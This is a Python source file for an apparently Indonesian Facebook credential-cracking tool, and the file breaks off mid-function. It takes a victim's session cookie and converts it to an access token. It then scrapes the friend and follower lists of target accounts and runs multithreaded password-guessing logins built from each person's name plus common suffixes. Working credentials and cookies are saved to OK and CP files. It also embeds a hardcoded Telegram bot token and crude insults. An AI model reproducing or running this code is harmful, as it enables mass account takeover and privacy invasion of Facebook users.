method = []
pwpluss,pwnya=[],[]
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
domris = random.choice(['bold blue','bold green','bold yellow'])

try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00FF00]"
	W1 = random.choice([M2,H2,K2])
	W2 = random.choice([K2,M2,K2])
	W3 = random.choice([H2,K2,M2])
	color_panel = "#00FF00"
	color_ok = "#00FF00"
	color_cp = "#FFFF00"
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
ID="5587313827";
tok="5660344060:AAED1OE3pftSW0MKvOEBcVugy_wvF-OoA90"

hour = datetime.datetime.now().hour
#--> Pengkondisian Jam Untuk Salam Harian
if hour < 4:
  hhl = f"Selamat Dini Hari"
elif 4 <= hour < 12:
  hhl = f"Selamat Pagi"
elif 12 <= hour < 15:
  hhl = "Selamat Pagi"
elif 15 <= hour < 17:
  hhl = f"Selamat Sore"
elif 17 <= hour < 18:
  hhl = f"Selamat Sore"
else:
  hhl = f"Selamat Malam"
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	cetak(nel(f'''{K2}   
████████ ██   ██ ███████  ██████  
   ██    ██   ██ ██      ██    ██        RECODE BY YOHUNGKUL
   ██    ███████ █████   ██    ██        INSTA : @theoo2811_
   ██    ██   ██ ██      ██    ██        TOOLS V01.01
   ██    ██   ██ ███████  ██████  
                 ''',width=79,title=f'[bold green]BANNER',style='bold hot_pink2'))
#--------------------[ BAGIAN-MASUK ]--------------#
import requests,json,re
ses = requests.Session()
#def loginraf():
#	clear()
#	banner()
#	tree = Tree(' ')
#	tree.add(f'{h}1.  {P} CRACK NO LOGIN'):	tree.add(f'{h}2. {P} CRACK LOGIN COOKIE')
#	tree.add(f'{h}0. {P} EXIT')
#	cetak(tree)
#	RAF_MKZ = input(f'{M} ╰─ {P}PILIH : ')
#	if RAF_MKZ in ['1','01']:
#		lainnya()
#	if RAF_MKZ in ['2','02']:
#		login()
#	elif RAF_MKZ in ['0','00']:
#		exit()
#	else :
#		print(f'╰─ PILIH YG BENAR BANG')
#		time.sleep(5)
#		back()
#
def login():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			li = ' ╰─  Problem Internet Connection, Check And Try Again'

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	except IOError:

		login_lagi334()

		

def login_lagi334():

	try:
#	        os.system('clear')
#	   	 
#                print(f'{P}JANGAN GUNAKAN AKUN PRIBADI') 
		banner()
		your_cookies = input(' ╰─   masukkan kontol : ')

		with requests.Session() as r:

			try:

				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})

				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}

				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)

				code, user_code = response['code'], response['user_code']

				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))

				r.headers.pop('content-type')

				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})

				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text

				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):

					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()

				else:

					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')

					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)

					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)

					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}

					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})

					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})

					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):

						r.headers.pop('content-type');r.headers.pop('origin')

						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')

						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)

						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)

						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)

						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)

						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)

						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)

						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)

						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)

						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)

						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})

						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}

						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text

						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')

						r.headers.pop('content-type');r.headers.pop('origin')

						r.headers.update({'referer': 'https://m.facebook.com/',})

						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text

						if 'Sukses!' in str(response6):

							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})

							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text

							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)

							print(f"\n {k}╰─  Token : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)

							print("\n ╰─  Login Berhasil | Jalankan ulang Script nya");exit()

			except Exception as e:

				print(" ╰─  Cookies Mokad bang")

				os.system('rm -rf .token.txt && rm -rf .cok.txt')

				print(e)

				time.sleep(3)

				back()

	except:pass
#------------------[ BAGIAN-MENU ]----------------#
from rich.console import Console
from rich.table import Table
def menu(my_name,my_id):
	try:
		cok = open('.cok.txt','r').read()
		token = open('.token.txt','r').read()
		
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	table=Table()
	table.add_column("NO",width=11,justify="center",style="white")
	table.add_column("MENU",justify="center",width=43,style= "white")
	table.add_column("STATUS",justify="center",width=11,style="green")
	table.add_row("01","CRACK PUBLIK","ONLINE")
	table.add_row("02","CRACK MASSAL","ONLINE")
	table.add_row("03","CRACK FILE","ONLINE")
	table.add_row("04","CEK RESULT","ONLINE")
	table.add_row("05", "DONASI UNTUK YO", "ONLINE")
	table.add_row("06", "GRUP Milw0rm • Code", "ONLINE")
	table.add_row("00", "KELUAR", "ONLINE")
	Consol=Console()
	cetak(nel(table,width=79,title=f"[bold green]MENU",style="bold hot_pink2"))

	RAF_MKZ=wa.input(f"  [bold red] ╰─ [bold white]PILIH : [bold green]") 
	if RAF_MKZ in ['1','01']:
		raf_dump()
	elif RAF_MKZ in ['2','02']:
		dump_massal()
	elif RAF_MKZ in ['3','03']:
		crack_file()
	elif RAF_MKZ in ['4','04']:
		result()
	elif RAF_MKZ in ['5','05']:
		cetak(panel(f"Sebentar Anda Akan Di Arahkan Menuju Link Donasi Untuk yo Wkwwk",width=90,title=f"[bold green]Link Donasi",padding=(0,8),style=f"bold white"))
		os.system("xdg-open https://saweria.co/yo89")
	elif RAF_MKZ in ['6','06']:
		cetak(panel(f"Sebentar Anda Akan Di Arahkan Menuju WhatsApp",width=90,title=f"[bold green]Link Grup Milw0rm • Code",padding=(0,8),style=f"bold white"))
		os.system("xdg-open https://chat.whatsapp.com/KhOPU0bKhw2H332gKslBN8")
	elif RAF_MKZ in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'{m}Sukses Logout+Hapus Cookies{x}')
		exit()
	else:
		print(' ╰─  Pilih Yang Bener Asu ')
		back()
def error():
	print(f' ╰─  Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	back() 
#-----------------[ CRACK NAMA ]-----------------#
def lainnya():
	tree = Tree(' ')
	tree.add(f'{h}1. {P}CRACK USERNAME')
	tree.add(f'{h}2. {P}CRACK FOLLOWERS')
	cetak(tree)
	RAF_MKZ=wa.input(f"  [bold grey] ╰─ PILIH : [bold green]") 
	if RAF_MKZ in ['1','01']:
		crack_nama()
	elif RAF_MKZ in ['2','02']:
		pengikut()
	else:
		print ('PILIH YANG BENER BANG')
		time.sleep(5)
		back()
		
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' ╰─  Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" ╰─  Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" ╰─  Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()

def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun ","ayu","putri"]
	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
	nam = wa.input(f' ╰─  Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
	
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f' [{hh}>{P}] Dump Dari Email, Max 1000 Id')
	nama = input(' target : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] Masukan 1 Nama Saja')
	doma = input(' domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] Masukan Domain Yang Benar')
	jumlah = input(' total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==2000:atur_atur()
		print('\r Sedang Dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	setting()	
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=100,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"{domris}"))
	kz = input(f'\n {P}[{x}{H}?{x}{P}]{x} {P}select{x} : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} ╰─  {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n ╰─  Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' ╰─  Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def raf_dump():
	try:
		cok = open('.cok.txt','r').read()
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	pil = input(f'{P} ╰─  {P}Masukan ID target : \x1b[1;92m ')
	try:
		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koH['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('')
		print(f'{M} ╰─  {P}Total ID yang Terkumpul : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(' ╰─  Internet Lu Gak Ada Anjing')
		exit()
	except (KeyError,IOError):
		print(' ╰─  Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{m}╰─ {P}Mau Berapa Idz Target  :  \x1b[1;92m')) 
	except ValueError:
		print(' ╰─  Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f' [{h}*{x}] Friendship Not Public  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{m}╰─ {P}Masukan Idz Target Yang Ke ' +str(yz)+ ' : \x1b[1;92' )
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' ╰─  Unstable Signal ')
			exit()
	try:
		cetak(nel(f'[bold white]Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)),width=79, title=f'[bold green]TOTAL ID', style='bold hot_pink2')) 
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' ╰─  Unstable Signal ')
		back()
	except (KeyError,IOError):
		print(f' ╰─  {k} Friendship Not Public {x}')
		time.sleep(3)
		back()
		
def crack_file():
	try:vin = os.listdir('/sdcard/ALVINO-DUMP')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ALVINO-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{h}[{P}>{h}] {x} %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	table=Table()
	table.add_column("NO", justify="center", width=11, style="white") 
	table.add_column("MENU", justify="center", width=36, style="white") 
	table.add_column("STATUS", justify="center", width=20, style="green")
	table.add_row("01", "CRACK ID OLD", " NOT RECOMENDED") 
	table.add_row("02","CRACK ID NEW","RECOMENDED")
	table.add_row("03","CRACK ID RANDOM","VERY RECOMENDED")
	cetak(nel(table, width=79, title=f"[bold green]URUTAN ID",style="bold hot_pink2"))
	hu = Console().input(f'[bold red] ╰─ [bold white]Pilih urutan id : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' ╰─  Pilih Yang Bener Kontooll ')
		exit()
	table=Table()
	table.add_column("NO",justify="center",width=11,style="white")
	table.add_column("MENU CRACK ",justify="center",width=36,style="white")
	table.add_column("STATUS",justify="center",width=20,style="green")
	table.add_row("01","asycn m.fb","VERY RECOMENDED")
	table.add_row("02","asycn mbasic","recomended")
	table.add_row("03","reguler m.fb","recomended")
	table.add_row("04","validate m.fb","recomended")
	cetak(nel(table,width=79,title=f"[bold green]METODE LOGIN",style="bold hot_pink2"))
	hc = input(f'{M} ╰─  {P}Pilih metode : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	elif hc in ['3','03']:
		method.append('free')
	elif hc in ['4','04']:
		method.append('mobilev2')
	elif hc in ['5','05']:
		method.append('lawakv1')
	elif hc in ['6','06']:
	    method.append('lawakv2')
	else:
		method.append('mobile')
#	print('')
#	_jembot_ = input('\r╰─  Tampilkan Aplikasi y/t : \x1b[1;93m ')
#	if _jembot_ in ['']:
#		print('{M} ╰─  Pilih Yang Bener ')
#		back()
#	elif _jembot_ in ['y','Y']:
#		taplikasi.append('ya')
#	else:
#		taplikasi.append('no')
#	pwplus=input(f'\r╰─  {P}TAMBAHKAN SANDI MANUAL? Y/T : \x1b[1;93m ')
#	if pwplus in ['y','Y']:
#		pwpluss.append('ya')
#		pwku=input(f'\r╰─  {P}Masukkan Sandi : ')
#		pwkuh=pwku.split(',')
#		for xpw in pwkuh:
#			pwnya.append(xpw)
#	else:
#		pwpluss.append('no')
		
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=79,title=f"[bold green]Setting User-Agent",style="bold hot_pink2")) 
	uatambah = input(f'\r╰─  {P}TAMBAHKAN USER AGENT(UA) Y/N : \x1b[1;93m ')
	if uatambah in ['y','Ya','ya','Y']:
		uman.append('y')
		bzer = input(f' ╰─  Masukan User-Agent : \x1b[1;93m ')
		usman1.append(bzer)
	else:
		uman.append('tidak')
	passwrd()
	
	
from datetime import datetime    	
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	#print(f'{asu} FILE RESULT TERSIMPAN DI ↓')
	sayang=[]
	sayang.append(panel(f'[bold green]%s [bold white]'%(okc), width=39, title=f"[bold green]OK SAVE IN", style="bold hot_pink2")) 
	sayang.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=39,title=f"[bold yellow]CP SAVE IN",style="bold hot_pink2"))
	wa.print(Columns(sayang))
	print(f'\n\t\t\t{P}ON/OF MODE PESAWAT SETIAP {M}200 {P}IDZ')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:

						pwv.append(nmf)

						pwv.append(frs+'01')

						pwv.append(frs+'02')

						pwv.append(frs+'03')

						pwv.append(frs+'04')

						pwv.append(frs+'05')

						pwv.append(frs+'06')

						pwv.append(frs+'07')

						pwv.append(frs+'08')

						pwv.append(frs+'09')

						pwv.append(frs+'12')

						pwv.append(frs+'123')

						pwv.append(frs+'321')
						
						pwv.append(frs+'4321')
						
						pwv.append(frs+'54321')

						pwv.append(frs+'1234')

						pwv.append(frs+'12345')

						pwv.append(frs+'123456')

						pwv.append(frs+'sayang')

						pwv.append(frs+'cantik')

				else:

					if len(frs)<3:

						pwv.append(nmf)

					else:

						pwv.append(nmf)

						pwv.append(frs+'01')

						pwv.append(frs+'02')

						pwv.append(frs+'03')

						pwv.append(frs+'04')

						pwv.append(frs+'05')

						pwv.append(frs+'06')

						pwv.append(frs+'07')

						pwv.append(frs+'08')

						pwv.append(frs+'09')

						pwv.append(frs+'12')

						pwv.append(frs+'123')

						pwv.append(frs+'321')
						
						pwv.append(frs+'4321')
						
						pwv.append(frs+'54321')

						pwv.append(frs+'1234')

						pwv.append(frs+'12345')

						pwv.append(frs+'123456')

						pwv.append(frs+'sayang')
					
						pwv.append(frs+'cantik')
						
						pwv.append('memek')
						
						pwv.append('sayang')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mobilev2' in method:
					pool.submit(crackmobilev2,idf,pwv)
				elif 'lawakv1' in method:
					pool.submit(cracklawakv1,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'lawakv2' in method:
					pool.submit(cracklawakv2,idf,pwv)
				else:
					pool.submit(crackmbasic,idf,pwv)
		print('')
	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
	print(f'  [{h}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
	
def useragent():
	sambro = str(random.randint(1,100))+'.'+str(random.randint(0,9))
	android_version = str(random.randint(1,12))
